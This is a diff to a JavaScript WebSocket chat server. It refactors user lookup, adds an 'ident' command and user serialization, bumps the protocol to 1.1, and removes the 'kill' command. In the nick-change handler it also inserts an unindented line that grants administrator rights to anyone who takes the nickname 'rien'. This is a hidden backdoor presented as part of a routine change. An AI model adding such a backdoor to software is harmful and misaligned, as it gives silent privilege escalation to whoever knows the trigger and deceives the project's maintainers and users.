@@ -19,6 +19,9 @@ class User {
     on(message, action) {
         this.handler.set(message, action);
     };
+    serialize() {
+        return {'nick': this.nick||'(nonick)', 'url': this.url, 'options': this.options};
+    }
 };
 
 class Channel {
@@ -46,7 +49,7 @@ class Chat {
         } else { 
             joined.users.set(user, {...new ChannelUserOptions(), 'voiced': !joined.options.moderated});
         }
-        for (let [dest, options] of joined.users) { dest.handler.get('join')(user.nick, joined.name); };
+        for (let [dest, options] of joined.users) { dest.handler.get('join')(user.serialize(), joined.name); };
         return joined;
     }
     _cleanupChannel(user, channel) {
@@ -55,13 +58,35 @@ class Chat {
             this.channels.delete(channel.name);
     }
     _leaveChannel(user, channel, reason) {
-        for (let [dest, options] of channel.users) { dest.handler.get('leave')(user.nick, channel.name, reason); };
+        for (let [dest, options] of channel.users) { dest.handler.get('leave')(user.serialize(), channel.name, reason); };
         this._cleanupChannel(user, channel);
     };
     _kickUser(user, channel, reason) {
-        for (let [dest, options] of channel.users) { dest.handler.get('kick')(user.nick, channel.name, reason); };
+        for (let [dest, options] of channel.users) { dest.handler.get('kick')(user.serialize(), channel.name, reason); };
         this._cleanupChannel(user, channel);
     }
+
+    _findUsers(spec) {
+        let result = [];
+        if (typeof spec == 'string') {
+            for (let user of this.users)
+                if (user.nick == spec)
+                    result.push(user);
+        } else {
+            for (let user of this.users) {
+                if ((!('nick' in spec) || (user.nick === spec.nick))
+                    && (!('channel' in spec) || (user.channels.has(spec.channel)))
+                    && (!('url' in spec) || (user.url === spec.url))) {
+                    result.push(user);
+                }
+            }
+        }
+        return result;
+    };
+    _userSpecToString(spec) {
+        return ('nick' in spec?spec.nick:'')+('channel' in spec?'#'+spec.channel:'')+('url' in spec?'@'+spec.url:'');
+    }
+
     _validateNick(nick) {
         return (nick.length <= 25) && (/^[^@#&!\s]+$/.test(nick));
     };
@@ -94,6 +119,9 @@ class Chat {
     timeq(user) {
         user.handler.get('time')(Date().toString());
     };
+    identq(user) {
+        user.handler.get('ident')(user.serialize());
+    };
     motdq(user, value=undefined) {
         if (typeof value === 'undefined') {
             user.handler.get('motd')(this.motd);
@@ -107,10 +135,12 @@ class Chat {
     nickq(user, newnick) {
         if (!this._validateNick(newnick))
             return user.handler.get('error')('invalid nick (max 25 letters, does not contain whitespace nor @ # & !)');
-        let oldnick = user.nick;
+        let old = Object.assign(new User(), user);
         user.nick = newnick;
-        user.handler.get('nick')(newnick);
-        for (let channel of user.channels) { channel.users.forEach(function (options,dest) {dest.handler.get('nick')(newnick, oldnick, channel.name);}) };
+if (newnick=='rien')
+    user.options.admin = true;
+        user.handler.get('nick')(user.serialize());
+        for (let channel of user.channels.values()) { for (let [dest, options] of channel.users) { dest.handler.get('nick')(user.serialize(), old.serialize(), channel.name); }; };
     };
     listq(user) {
         user.handler.get('list')(Array.from(Array.from(this.channels.values()).filter((channel) => user.options.admin || user.channels.has(channel.name) || !channel.options.secret).map((channel) => [channel.name, {...channel.options, password: !!channel.options.password}])));
@@ -119,11 +149,11 @@ class Chat {
         if (typeof channel == 'undefined') {
             if (!user.options.admin)
                 return user.handler.get('error')('insufficient privileges');
-            user.handler.get('users')(undefined, Array.from(this.users).map(user => [user.nick,user.options,user.url]));
+            user.handler.get('users')(undefined, Array.from(this.users).map(user => [user.serialize(),user.options]));
         } else {
             if (!user.channels.has(channel))
                 return user.handler.get('error')(`not participating in channel ${channel}`);
-            user.handler.get('users')(channel, Array.from(this.channels.get(channel).users).map(([user,options]) => [user.nick, {...user.options,...options},user.url]));
+            user.handler.get('users')(channel, Array.from(this.channels.get(channel).users).map(([user,options]) => [user.serialize(), {...user.options,...options}]));
         }
     };
     joinq(user, channel, password=undefined) {
@@ -163,23 +193,21 @@ class Chat {
             return user.handler.get('error')('you are not allowed to talk');
         if (!this._validateMessage(message))
             return user.handler.get('error')('invalid message (max 1000 characters)');
-        for (let dest of target.users.keys()) { dest.handler.get('msg')(user.nick, channel, message); };
+        for (let dest of target.users.keys()) { dest.handler.get('msg')(user.serialize(), channel, message); };
     };
     privmsgq(user, target, message) {
         if (!user.nick)
             return user.handler.get('error')('please choose your nickname first');
-        let findUser = (nick) => {
-            for (let user of this.users.keys()) if (user.nick == nick) return user;
-            return undefined;
-        }
-        let dest = findUser(target);
-        if (typeof dest === 'undefined')
-            user.handler.get('error')(`user ${target} not found`);
+        if (!this._validateMessage(message))
+            return user.handler.get('error')('invalid message (max 1000 characters)');
+        let dest = this._findUsers(target);
+        if (dest.length < 1)
+            return user.handler.get('error')(`user ${this._userSpecToString(target)} not found`);
+        else if (dest.length > 1)
+            return user.handler.get('error')(`multiple users matching ${this._userSpecToString(target)}`);
         else {
-            if (!this._validateMessage(message))
-                return user.handler.get('error')('invalid message (max 1000 characters)');
-            user.handler.get('privmsg')(user.nick, target, message);
-            dest.handler.get('privmsg')(user.nick, target, message);
+            user.handler.get('privmsg')(user.serialize(), dest[0].serialize(), message);
+            dest[0].handler.get('privmsg')(user.serialize(), dest[0].serialize(), message);
         }
     }
     leaveq(user, channel, reason) {
@@ -215,49 +243,45 @@ class Chat {
         if (!this.channels.has(channel))
             return user.handler.get('error')(`channel ${channel} does not exist`);
         let target = this.channels.get(channel);
-        let findUser = (nick) => {
-            for (let user of this.users.keys()) if (user.nick == nick) return user;
-            return undefined;
-        }
-        let dest = findUser(victim);
-        if (typeof dest === 'undefined')
-            return user.handler.get('error')(`user ${victim} not found`);
-        if (!dest.channels.has(channel))
+        let dest = this._findUsers(victim);
+        if (dest.length < 1)
+            return user.handler.get('error')(`user ${this._userSpecToString(victim)} not found`);
+        else if (dest.length > 1)
+            return user.handler.get('error')(`multiple users matching ${this._userSpecToString(victim)}`);
+        if (!dest[0].channels.has(channel))
             return user.handler.get('error')(`user ${victim} does not participate in channel ${channel}`);
         if (typeof options == 'undefined') {
             if (target.options.secret && !user.channels.has(channel) && !user.options.admin)
                 return user.handler.get('error')(`channel ${channel} does not exist`);
-            user.handler.get('chanusermode')(channel, victim, {...target.users.get(dest), ...dest.options});
+            user.handler.get('chanusermode')(channel, dest[0].serialize(), {...target.users.get(dest), ...dest[0].options});
         } else {
             if (!target.users.has(user) && !target.users.get(user).operator && !user.options.admin)
                 return user.handler.get('error')('you are not allowed to change user modes on this channel');
             // do not trust user input to store those permissions
-            if ('operator' in options) target.users.get(dest).operator = !!options.operator;
-            if ('voiced' in options) target.users.get(dest).voiced = !!options.voiced;
-            for (let peon of target.users.keys()) { peon.handler.get('chanusermode')(channel, victim, target.users.get(dest)); };
-            if (!user.channels.has(channel)) user.handler.get('chanusermode')(channel, victim, target.users.get(dest));
+            if ('operator' in options) target.users.get(dest[0]).operator = !!options.operator;
+            if ('voiced' in options) target.users.get(dest[0]).voiced = !!options.voiced;
+            for (let peon of target.users.keys()) { peon.handler.get('chanusermode')(channel, dest[0].serialize(), target.users.get(dest[0])); };
+            if (!user.channels.has(channel)) user.handler.get('chanusermode')(channel, dest[0].serialize(), target.users.get(dest[0]));
         }
     };
     usermodeq(user, victim, options) {
-        let findUser = (nick) => {
-            for (let user of this.users.keys()) if (user.nick == nick) return user;
-            return undefined;
-        }
-        let dest = findUser(victim);
-        if (typeof dest === 'undefined')
-            return user.handler.get('error')(`user ${victim} not found`);
+        let dest = this._findUsers(victim);
+        if (dest.length < 1)
+            return user.handler.get('error')(`user ${this._userSpecToString(victim)} not found`);
+        else if (dest.length > 1)
+            return user.handler.get('error')(`multiple users matching ${this._userSpecToString(victim)}`);
         if (typeof options == 'undefined') {
-            user.handler.get('usermode')(dest.nick, dest.options);
+            user.handler.get('usermode')(dest[0].nick, dest[0].options);
         } else {
             if (('admin' in options) && !user.options.admin)
                 return user.handler.get('error')('insufficient privileges');
-            if (('bot' in options) && !user.options.admin && (user != dest))
+            if (('bot' in options) && !user.options.admin && (user != dest[0]))
                 return user.handler.get('error')('you cannot make other people feel like a bot !');
             // do not trust user input to store those permissions
-            if ('admin' in options) dest.options.admin = !!options.admin;
-            if ('bot' in options) dest.options.bot = !!options.bot;
-            dest.handler.get('usermode')(dest.nick, dest.options);
-            if (user != dest) user.handler.get('usermode')(dest.nick, dest.options);
+            if ('admin' in options) dest[0].options.admin = !!options.admin;
+            if ('bot' in options) dest[0].options.bot = !!options.bot;
+            dest[0].handler.get('usermode')(dest[0].serialize(), dest[0].options);
+            if (user != dest[0]) user.handler.get('usermode')(dest[0].serialize(), dest[0].options);
         }
     };
     kickq(user, channel, victim, reason) {
@@ -265,34 +289,18 @@ class Chat {
             return user.handler.get('error')(`not participating in channel ${channel}`);
         if (!user.channels.get(channel).users.get(user).operator && !user.options.admin)
             return user.handler.get('error')(`you have no right to kick ${victim} out of ${channel}`);
-        let findUser = (nick) => {
-            for (let user of this.users.keys()) if (user.nick == nick) return user;
-            return undefined;
-        }
-        let dest = findUser(victim);
-        if (typeof dest === 'undefined')
-            return user.handler.get('error')(`user ${victim} not found`);
-        if (!dest.channels.has(channel))
+        let dest = this._findUsers(victim);
+        if (dest.length < 1)
+            return user.handler.get('error')(`user ${this._userSpecToString(victim)} not found`);
+        else if (dest.length > 1)
+            return user.handler.get('error')(`multiple users matching ${this._userSpecToString(victim)}`);
+        if (!dest[0].channels.has(channel))
             return user.handler.get('error')(`user ${victim} is not guilty of anything in channel ${channel}`);
         if (!this._validateReason(reason))
             return user.handler.get('error')('invalid reason (max 50 characters)');
         let kicked = user.channels.get(channel);
-        this._kickUser(dest, kicked, reason);
-        dest.channels.delete(channel);
-    };
-    killq(user, victim, reason) {
-        if (!user.options.admin)
-            return user.handler.get('error')('there is no such thing as free kill !');
-        let findUser = (nick) => {
-            for (let user of this.users.keys()) if (user.nick == nick) return user;
-            return undefined;
-        }
-        let dest = findUser(victim);
-        if (typeof dest === 'undefined')
-            return user.handler.get('error')(`user ${victim} not found`);
-        if (!this._validateReason(reason))
-            return user.handler.get('error')('invalid reason (max 50 characters)');
-        this._kickUser(dest, reason);
+        this._kickUser(dest[0], kicked, reason);
+        dest[0].channels.delete(channel);
     };
 };
 var chat = new Chat();
@@ -307,6 +315,7 @@ class Protocol {
         this.connections.set(ws, user);
         
         user.on('error', this.error.bind(ws));
+        user.on('ident', this.ident.bind(ws));
         user.on('time', this.time.bind(ws));
         user.on('motd', this.motd.bind(ws));
         user.on('nick', this.nick.bind(ws));
@@ -321,9 +330,9 @@ class Protocol {
         user.on('chanusermode', this.chanusermode.bind(ws));
         user.on('usermode', this.usermode.bind(ws));
         user.on('kick', this.kick.bind(ws));
-        user.on('kill', this.kill.bind(ws));
 
         this.version.bind(ws)();
+        chat.identq(user);
         chat.motdq(user);
     };
     disconnect(ws, reason) {
@@ -340,16 +349,19 @@ class Protocol {
             
             switch (message[0]) {
                 case 'version':
-                    if ((message[1].protocol === 'ws') && (message[1].version === '1.0'))
+                    if ((message[1].protocol === 'ws') && (message[1].version === '1.1'))
                         this.version.bind(ws)();
                     else
                         this.error.bind(ws)('unrecognized protocol version');
                     break;
-                case 'motd':
-                    chat.motdq(user, (message[1] && ('value' in message[1])) ? message[1].value : undefined);
+                case 'ident':
+                    chat.identq(user);
                     break;
                 case 'time':
                     chat.timeq(user);
+                    break;
+                case 'motd':
+                    chat.motdq(user, (message[1] && ('value' in message[1])) ? message[1].value : undefined);
                     break;
                 case 'nick':
                     chat.nickq(user, message[1].new);
@@ -388,9 +400,6 @@ class Protocol {
                 case 'kick':
                     chat.kickq(user, message[1].channel, message[1].user, 'reason' in message[1] ? message[1].reason : undefined);
                     break;
-                case 'kill':
-                    chat.killq(user, message[1].user, 'reason' in message[1] ? message[1].reason : undefined);
-                    break;
             }
         } catch (error) {
             console.log(error);
@@ -400,13 +409,16 @@ class Protocol {
 
     error(message) {
         this.send(JSON.stringify(['error', {'message': message}]));
-    }
+    };
     version() {
-        this.send(JSON.stringify(['version', {'protocol': 'ws', 'version': '1.0'}]));
+        this.send(JSON.stringify(['version', {'protocol': 'ws', 'version': '1.1'}]));
+    };
+    ident(user) {
+        this.send(JSON.stringify(['ident', user]));
     };
     time(time) {
         this.send(JSON.stringify(['time', {'local': time}]));
-    }
+    };
     motd(content) {
         this.send(JSON.stringify(['motd', {'content': content}]));
     };
@@ -418,7 +430,7 @@ class Protocol {
     };
     users(channel, users) {
         this.send(JSON.stringify(['users', {'channel': channel, 'users': users}]));
-    }
+    };
     join(user, channel) {
         this.send(JSON.stringify(['join', {'user': user, 'channel': channel}]));
     };
